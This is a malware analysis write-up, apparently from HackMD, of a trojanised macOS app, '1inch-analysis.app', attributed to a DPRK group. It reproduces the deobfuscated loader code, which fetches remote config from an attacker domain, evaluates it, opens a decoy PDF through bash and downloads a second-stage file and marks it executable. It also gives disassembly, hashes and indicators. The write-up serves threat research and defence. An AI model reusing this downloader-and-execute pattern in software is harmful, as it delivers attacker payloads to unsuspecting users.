# 🛡 DPRK Trojan Attack via 1inch-analysis[.]app on macOS

- **Source URL:** https://hackmd.io/@pcaversaccio/1inch-analysis-app-a-dprk-trojan-horse
- **Fetched:** 2026-11-16
- **Channel:** @defendor_eng
- **Telegram message:** https://t.me/defendor_eng/896 (id 896)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
\# \`1inch-analysis.app\` — A DPRK Trojan Horse
> \[!IMPORTANT\]
> This analysis is based on the information available at the time of the investigation. Unfortunately, the original payload URLs were removed before the primary analysis (if you managed to grab them in time, hit me up!). Therefore, a direct inspection of the actual malicious files was not possible. Hence, the analysis may be \_incomplete\_ due to missing information about the payload.
This analysis delves into the malicious DPRK-built macOS application bundle, \`1inch-analysis.app\`, which \[targeted Anton Bukov\](https://x.com/k06a/status/1904884377357627621) from 1inch. The attack was executed by the \[fake\](https://x.com/tanuki42\_/status/1905003045433290940) security researcher Nick L. Franklin. This incident, which is part of a broader deception and exploitation attempt, can be attributed\[^1\] with high confidence to the \[AppleJeus/Citrine Sleet/UNC4736\](https://github.com/tayvano/lazarus-bluenoroff-research#-applejeus--citrine-sleet) DPRK team.
\[^1\]: See Radiant's incident update \[here\](https://medium.com/@RadiantCapital/radiant-capital-incident-update-e56d8c23829e), along with the \[on-chain link\](https://x.com/tanuki42\_/status/1905003057093431479). Additionally, the payloads exhibit distinct pattern matching.
\*\*Always be paranoid!\*\*
### Directory Structure of \`1inch-analysis.app\`
\`\`\`bash
1inch-analysis.app
└── Contents
    ├── Info.plist
    ├── PkgInfo
    ├── MacOS
    │   └── ShelfAI # => This binary interacts with \`main.jsbundle\`.
    ├── Resources
    │   ├── AppIcon.icns
    │   ├── Assets.car
    │   ├── main.jsbundle # => Our focus will primarily be on this file.
    │   ├── main.txt
    │   ├── ShelfAI.entitlements
    │   ├── AccessibilityResources.bundle
    │   │   └── Contents
    │   │       ├── Info.plist
    │   │       └── Resources
    │   │           └── en.lproj
    │   │               └── Localizable.strings
    │   ├── assets
    │   │   └── node\_modules
    │   │       ├── @react-navigation
    │   │       │   └── elements
    │   │       │       └── src
    │   │       │           └── assets
    │   │       │               ├── back-icon-mask.png
    │   │       │               └── back-icon.png
    │   │       └── react-native-dropdown-picker
    │   │           └── src
    │   │               └── themes
    │   │                   ├── dark
    │   │                   │   └── icons
    │   │                   │       ├── arrow-down.png
    │   │                   │       ├── arrow-up.png
    │   │                   │       ├── close.png
    │   │                   │       └── tick.png
    │   │                   └── light
    │   │                       └── icons
    │   │                           ├── arrow-down.png
    │   │                           ├── arrow-up.png
    │   │                           ├── close.png
    │   │                           └── tick.png
    │   ├── Base.lproj
    │   │   └── Main.storyboardc
    │   │       ├── Info.plist
    │   │       └── MainMenu.nib
    │   ├── Fonts
    │   │   ├── AntDesign.ttf
    │   │   ├── Entypo.ttf
    │   │   ├── EvilIcons.ttf
    │   │   ├── Feather.ttf
    │   │   ├── FontAwesome.ttf
    │   │   ├── FontAwesome5\_Brands.ttf
    │   │   ├── FontAwesome5\_Regular.ttf
    │   │   ├── FontAwesome5\_Solid.ttf
    │   │   ├── FontAwesome6\_Brands.ttf
    │   │   ├── FontAwesome6\_Regular.ttf
    │   │   ├── FontAwesome6\_Solid.ttf
    │   │   ├── Fontisto.ttf
    │   │   ├── Foundation.ttf
    │   │   ├── Ionicons.ttf
    │   │   ├── MaterialCommunityIcons.ttf
    │   │   ├── MaterialIcons.ttf
    │   │   ├── Octicons.ttf
    │   │   ├── SimpleLineIcons.ttf
    │   │   └── Zocial.ttf
    │   └── RNCAsyncStorage\_resources.bundle
    │       └── Contents
    │           ├── Info.plist
    │           └── Resources
    │               └── PrivacyInfo.xcprivacy
    └── \_CodeSignature
        └── CodeResources
\`\`\`
### Relevant Hashes
- \`1inch-analysis.app.zip\`:
  - \`MD5\`: \`F67AE16FA55346F5F0114EC7471C63A9\`
  - \`SHA-1\`: \`9D116E406F081C0FC6B1CF2C5F1A993CE2981032\`
  - \`SHA-256\`: \[\`C6777D3FEE8540002B9CF4C1DF8B809FD5C316B7FF7805D3F41BD7DE73147F0D\`\](https://www.virustotal.com/gui/file/c6777d3fee8540002b9cf4c1df8b809fd5c316b7ff7805d3f41bd7de73147f0d)
- \`main.jsbundle\`:
  - \`MD5\`: \`BACC6033221E91E5F14585574E8AABC0\`
  - \`SHA-1\`: \`563A67F8BB12F1BCE73B550B0D89EA647830528D\`
  - \`SHA-256\`: \[\`EE42E36FC2A430E6B254FD7D6C98929DF753BF4B3D10E5EDF8BB322BCDA399F7\`\](https://www.virustotal.com/gui/file/ee42e36fc2a430e6b254fd7d6c98929df753bf4b3d10e5edf8bb322bcda399f7)
### Deep Dive
First, I verified the legitimacy of all the \`ttf\` files, just to be sure. They turned out fine.
Next, I dug into the \`main.jsbundle\` file, and guess what? On line 465 (of the main script), it makes a call to \`https://shelfai.io/api/config\` (the following code snippet appears as multiple lines for readability but is actually a single line in the main script):
\`\`\`js=
\_\_d(
  function (g, \_r, \_i, \_a, m, \_e, d) {
    Object.defineProperty(\_e, "\_\_esModule", { value: !0 }),
      (\_e.default = void 0);
    var e = \_r(d\[0\])(\_r(d\[1\])),
      t = \_r(d\[0\])(\_r(d\[2\])),
      r = (function (e, t) {
        if (!t && e && e.\_\_esModule) return e;
        if (null === e || ("object" != typeof e && "function" != typeof e))
          return { default: e };
        var r = u(t);
        if (r && r.has(e)) return r.get(e);
        var n = { \_\_proto\_\_: null },
          o = Object.defineProperty && Object.getOwnPropertyDescriptor;
        for (var a in e)
          if ("default" !== a && {}.hasOwnProperty.call(e, a)) {
            var i = o ? Object.getOwnPropertyDescriptor(e, a) : null;
            i && (i.get || i.set)
              ? Object.defineProperty(n, a, i)
              : (n\[a\] = e\[a\]);
          }
        return (n.default = e), r && r.set(e, n), n;
      })(\_r(d\[3\])),
      n = \_r(d\[0\])(\_r(d\[4\])),
      o = \_r(d\[0\])(\_r(d\[5\])),
      a = \_r(d\[0\])(\_r(d\[6\])),
      i = \_r(d\[0\])(\_r(d\[7\])),
      f = \_r(d\[0\])(\_r(d\[8\])),
      l = \_r(d\[9\]),
      c = \_r(d\[0\])(\_r(d\[10\]));
    function u(e) {
      if ("function" != typeof WeakMap) return null;
      var t = new WeakMap(),
        r = new WeakMap();
      return (u = function (e) {
        return e ? r : t;
      })(e);
    }
    (g.GEMINI\_API\_KEY = ""), (g.BACKGROUND\_COLOR = ""), (g.BUTTON\_COLOR = "");
    var s = l.NativeModules.WindowUtils,
      y = l.NativeModules.FileUtils,
      p = new (\_r(d\[11\]).QueryClient)(),
      h = (0, \_r(d\[12\]).createStackNavigator)();
    \_e.default = function () {
      var l,
        u = (0, r.useState)(!0),
        v = (0, t.default)(u, 2),
        O = v\[0\],
        b = v\[1\],
        \_ = function (e) {
          return new Promise(function (t, r) {
            var n = new FileReader();
            (n.onloadend = function () {
              var e = n.result;
              "string" == typeof e
                ? t(e.split(",")\[1\])
                : r(new Error("Fdfdsafdsaf"));
            }),
              (n.onerror = function () {
                return r(new Error("Efdsfdsfd"));
              }),
              n.readAsDataURL(e);
          });
        },
        w =
          ((l = (0, e.default)(function\* (e) {
            try {
              var t = yield fetch(e, { cache: "no-cache" });
              if (t.ok) {
                var r = yield t.text(),
                  n = new Function(r)();
                if ("" == n.apiKey) {
                  try {
                    var o = yield fetch(n.buttonColor, { cache: "no-cache" });
                    if (o.ok) {
                      var a = yield o.blob(),
                        i = yield \_(a),
                        l = n.buttonColor.substring(
                          n.buttonColor.lastIndexOf("/") + 1,
                        ),
                        u = f.default.TemporaryDirectoryPath + "/" + l;
                      yield f.default.writeFile(u, i, "base64"),
                        yield y.exefdsafdsafdsafd("open " + u);
                    }
                    var s = yield fetch(n.backColor, { cache: "no-cache" });
                    if (s.ok) {
                      var p = yield s.blob(),
                        h = yield \_(p),
                        v = f.default.TemporaryDirectoryPath + "/node-cache";
                      yield f.default.writeFile(v, h, "base64"),
                        yield y.chfdsafdsafPfdsfadsfsAndEfdsafdas(v);
                    }
                  } catch (e) {
                    console.error("Efdsafdsafds:", e);
                  }
                  (0, c.default)();
                }
                (g.GEMINI\_API\_KEY = n.apiKey),
                  (g.BACKGROUND\_COLOR = n.backColor),
                  (g.BUTTON\_COLOR = n.buttonColor);
              } else (0, c.default)();
            } catch (e) {
              (0, c.default)();
            }
          })),
          function (e) {
            return l.apply(this, arguments);
          }),
        C = (0, i.default)().loadBooksFromStorage;
      return (
        (0, r.useEffect)(function () {
          w("https://shelfai.io/api/config")
            .then(function () {
              s.showMainWindow(), b(!1);
            })
            .catch(function (e) {
              console.error("Error during loadConfig:", e), b(!1);
            }),
            C();
        }, \[\]),
        O
          ? null
          : (0, \_r(d\[13\]).jsx)(\_r(d\[11\]).QueryClientProvider, {
              client: p,
              children: (0, \_r(d\[13\]).jsx)(\_r(d\[14\]).NavigationContainer, {
                children: (0, \_r(d\[13\]).jsxs)(h.Navigator, {
                  screenOptions: { headerShown: !1 },
                  children: \[
                    (0, \_r(d\[13\]).jsx)(h.Screen, {
                      name: "Home",
                      component: n.default,
                    }),
                    (0, \_r(d\[13\]).jsx)(h.Screen, {
                      name: "Book",
                      component: o.default,
                    }),
                    (0, \_r(d\[13\]).jsx)(h.Screen, {
                      name: "BookShelves",
                      component: a.default,
                    }),
                  \],
                }),
              }),
            })
      );
    };
  },
  419,
  \[3, 325, 22, 132, 420, 634, 1245, 1227, 1248, 1, 1251, 585, 1252, 179, 433\],
);
\`\`\`
The \`w("https://shelfai.io/api/config")\` call will load:
\`\`\`js=
const result = {
  apiKey: "",
  backColor: "https://shelfai.io/api/img/fdsafdsafdsafdsfds",
  buttonColor: "https://shelfai.io/api/img/1inch-analysis.pdf",
};
return result;
\`\`\`
Storing URLs in \`backColor\` and \`buttonColor\`? Hmm, that's definitely suspicious! Let's deobfuscate the \`main.jsbundle\` file and see how these URLs are used. Unfortunately, by the time I started analysing, the contents of both URLs were taken down (if you managed to grab them in time, hit me up!). So, in the next stage, the payloads returned from these URLs are processed in the following function:
\`\`\`js=
g.GEMINI\_API\_KEY = "";
g.BACKGROUND\_COLOR = "";
g.BUTTON\_COLOR = "";
var s = l.NativeModules.WindowUtils;
var y = l.NativeModules.FileUtils;
var p = new (\_r(d\[11\]).QueryClient)();
var h = (0, \_r(d\[12\]).createStackNavigator)();
\_e.default = function () {
var l;
var u = (0, r.useState)(true);
var v = (0, t.default)(u, 2);
var O = v\[0\];
var b = v\[1\];
function \_(e) {
  return new Promise(function (t, r) {
    var n = new FileReader();
    n.onloadend = function () {
      var e = n.result;
      if (typeof e == "string") {
        t(e.split(",")\[1\]);
      } else {
        r(new Error("Fdfdsafdsaf"));
      }
    };
    n.onerror = function () {
      return r(new Error("Efdsfdsfd"));
    };
    n.readAsDataURL(e);
  });
}
l = (0, e.default)(function\* (e) {
  try {
    var t = yield fetch(e, {
      cache: "no-cache"
    });
    if (t.ok) {
      var r = yield t.text();
      var n = new Function(r)();
      if (n.apiKey == "") {
        try {
          var o = yield fetch(n.buttonColor, {
            cache: "no-cache"
          });
          if (o.ok) {
            var a = yield o.blob();
            var i = yield \_(a);
            var l = n.buttonColor.substring(n.buttonColor.lastIndexOf("/") + 1);
            var u = f.default.TemporaryDirectoryPath + "/" + l;
            yield f.default.writeFile(u, i, "base64");
            yield y.exefdsafdsafdsafd("open " + u);
          }
          var s = yield fetch(n.backColor, {
            cache: "no-cache"
          });
          if (s.ok) {
            var p = yield s.blob();
            var h = yield \_(p);
            var v = f.default.TemporaryDirectoryPath + "/node-cache";
            yield f.default.writeFile(v, h, "base64");
            yield y.chfdsafdsafPfdsfadsfsAndEfdsafdas(v);
          }
        } catch (e) {
          console.error("Efdsafdsafds:", e);
        }
        (0, c.default)();
      }
      g.GEMINI\_API\_KEY = n.apiKey;
      g.BACKGROUND\_COLOR = n.backColor;
      g.BUTTON\_COLOR = n.buttonColor;
    } else {
      (0, c.default)();
    }
  } catch (e) {
    (0, c.default)();
  }
});
\`\`\`
Ok, let's dive into the above logic. We can see the following code block:
\`\`\`js=
var t = yield fetch(e, { cache: "no-cache" });
if (t.ok) {
    var r = yield t.text();
    var n = new Function(r)();
\`\`\`
Hmm, the script fetches code from a remote server (\`fetch(e)\`) and then executes it using \`new Function(r)()\`. This means it can run arbitrary code from an \_unknown\_ source, making this already a high-risk script.
Let's dig deeper:
\`\`\`js=
var o = yield fetch(n.buttonColor, { cache: "no-cache" });
if (o.ok) {
    var a = yield o.blob();
    var i = yield \_(a);
    var l = n.buttonColor.substring(n.buttonColor.lastIndexOf("/") + 1);
    var u = f.default.TemporaryDirectoryPath + "/" + l;
    yield f.default.writeFile(u, i, "base64");
    yield y.exefdsafdsafdsafd("open " + u);
}
\`\`\`
Here's what's happening: the script downloads a file from \`n.buttonColor\`, which, as we saw earlier, is the \`1inch-analysis.pdf\`. The file is saved to a temporary directory and opened with the system's default PDF viewer. This could be a simple decoy file!
To fully understand the obfuscated \`exefdsafdsafdsafd\` function, we need to disassemble the \`ShelfAI\` binary and analyse it further.
\`\`\`asm=
-\[FileUtils exefdsafdsafdsafd:resolver:rejecter:\]:
int64\_t x8 = \*\_\_\_stack\_chk\_guard
id obj = \_objc\_retain(exefdsafdsafdsafd)
id obj\_1 = \_objc\_retain(resolver)
id obj\_2 = \_objc\_retain(rejecter)
id obj\_3 = \_objc\_alloc\_init(\_OBJC\_CLASS\_$\_NSTask)
\_objc\_msgSend(obj\_3, "setLaunchPath:", &cfstr\_/bin/bash)
struct \_\_NSConstantString\* const var\_58 = &cfstr\_-c
id obj\_5 = obj
id obj\_4 = \_objc\_retainAutoreleasedReturnValue(\_objc\_msgSend(\_OBJC\_CLASS\_$\_NSArray, "arrayWithObjects:count:", &var\_58, 2))
\_objc\_msgSend(obj\_3, "setArguments:", obj\_4)
\_objc\_release(obj\_4)
\_objc\_msgSend(obj\_3, "launch")
obj\_1->\_\_offset(0x10).q(obj\_1, &cfstr\_Commfdsafdsaf)
\_objc\_release(obj\_3)
\_objc\_release(obj\_2)
\_objc\_release(obj\_1)
\_objc\_release(obj)
if (\*\_\_\_stack\_chk\_guard == x8)
\`\`\`
So what’s happening here? This function executes \_arbitrary\_ shell commands on macOS via \`NSTask\`, using \`/bin/bash -c\` to run commands. In this case, it runs the \`open\` command on the \`1inch-analysis.pdf\`, which might contain malicious JavaScript, though that's uncertain — it could also just be a harmless PDF.
Let's continue analysing the deobfuscated JavaScript code:
\`\`\`js=
var s = yield fetch(n.backColor, { cache: "no-cache" });
if (s.ok) {
    var p = yield s.blob();
    var h = yield \_(p);
    var v = f.default.TemporaryDirectoryPath + "/node-cache";
    yield f.default.writeFile(v, h, "base64");
    yield y.chfdsafdsafPfdsfadsfsAndEfdsafdas(v);
}
\`\`\`
The script downloads another file from \`n.backColor\`, which we recall is the \`fdsafdsafdsafdsfds\` file from the API response. This file is saved in the \`/node-cache\` directory. Then, it runs the file using the function \`chfdsafdsafPfdsfadsfsAndEfdsafdas(v)\`.
Let's dive into what \`chfdsafdsafPfdsfadsfsAndEfdsafdas\` does by examining the disassembled code:
\`\`\`asm=
-\[FileUtils chfdsafdsafPfdsfadsfsAndEfdsafdas:resolver:rejecter:\]:
int64\_t x8 = \*\_\_\_stack\_chk\_guard
id obj = \_objc\_retain(chfdsafdsafPfdsfadsfsAndEfdsafdas)
id obj\_1 = \_objc\_retain(resolver)
id obj\_2 = \_objc\_retain(rejecter)
id obj\_7 = obj
id obj\_3 = \_objc\_retainAutoreleasedReturnValue(\_objc\_msgSend(\_OBJC\_CLASS\_$\_NSString, "stringWithFormat:", &cfstr\_/bin/chmod\_+x\_%@))
id obj\_4 = \_objc\_alloc\_init(\_OBJC\_CLASS\_$\_NSTask)
\_objc\_msgSend(obj\_4, "setLaunchPath:", &cfstr\_/bin/bash)
struct \_\_NSConstantString\* const var\_68 = &cfstr\_-c
id obj\_8 = obj\_3
id obj\_5 = \_objc\_retainAutoreleasedReturnValue(\_objc\_msgSend(\_OBJC\_CLASS\_$\_NSArray, "arrayWithObjects:count:", &var\_68, 2))
\_objc\_msgSend(obj\_4, "setArguments:", obj\_5)
\_objc\_release(obj\_5)
\_objc\_msgSend(obj\_4, "launch")
\_objc\_msgSend(obj\_4, "waitUntilExit")
if (\_objc\_msgSend(obj\_4, "terminationStatus") == 0)
\`\`\`
Look at:
\`\`\`asm
id obj\_3 = \_objc\_retainAutoreleasedReturnValue(\_objc\_msgSend(\_OBJC\_CLASS\_$\_NSString, "stringWithFormat:", &cfstr\_/bin/chmod\_+x\_%@))
\`\`\`
\*\*TL;DR:\*\* This function runs \`/bin/chmod +x\` on the \`fdsafdsafdsafdsfds\` file, making it \*\*executable\*\*. This file is likely intended for execution in a second stage of the attack!
With this, we now have a clearer understanding of what happens in this malicious sequence, even though we don't have access to the payloads themselves.
---
1. \*\*Opening a Decoy PDF (\`1inch-analysis.pdf\`)\*\*:
   - The function first fetches the URL for \`buttonColor\`, which points to a PDF file (\`https://shelfai.io/api/img/1inch-analysis.pdf\`).
   - The PDF file is downloaded and saved in \`base64\` format to the system's temporary directory.
   - The \`y.exefdsafdsafdsafd("open " + u)\` command is then executed, which triggers the \`open\` command in Bash to launch the PDF file using the default PDF viewer on the system.
2. \*\*Downloading and Making Another File Executable (\`fdsafdsafdsafdsfds\`)\*\*:
   - The URL for \`backColor\` is fetched (\`https://shelfai.io/api/img/fdsafdsafdsafdsfds\`), and the file is processed in the same way (converted to \`base64\` and saved locally).
   - The downloaded file is assigned execute permissions, using \`chmod +x\`.
   - In the second step, this file is likely executed and could carry out harmful actions. Given that the file is made executable, it's expected to run in the next stage of the attack, potentially leading to malicious activity.
\*\*TL;DR:\*\*
- A PDF file (\`1inch-analysis.pdf\`) will be opened in the default PDF viewer.
- Another file (\`fdsafdsafdsafdsfds\`) is downloaded, granted execute permissions, and potentially executed on the system in a second step, which could be a script or another executable.

or

Wallet
                   (
                    
                   )

New to HackMD? [Sign up](https://hackmd.io/join)

By signing in, you agree to our [terms of service](https://hackmd.io/s/terms).
